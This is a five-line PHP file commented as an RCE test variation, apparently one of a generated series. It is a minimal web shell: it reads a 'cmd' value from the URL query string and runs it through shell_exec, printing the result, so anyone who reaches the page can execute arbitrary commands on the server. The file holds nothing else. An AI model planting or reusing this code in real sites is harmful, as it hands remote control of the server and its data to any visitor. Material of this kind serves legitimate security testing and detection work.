<?php
// RCE test variation #999
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>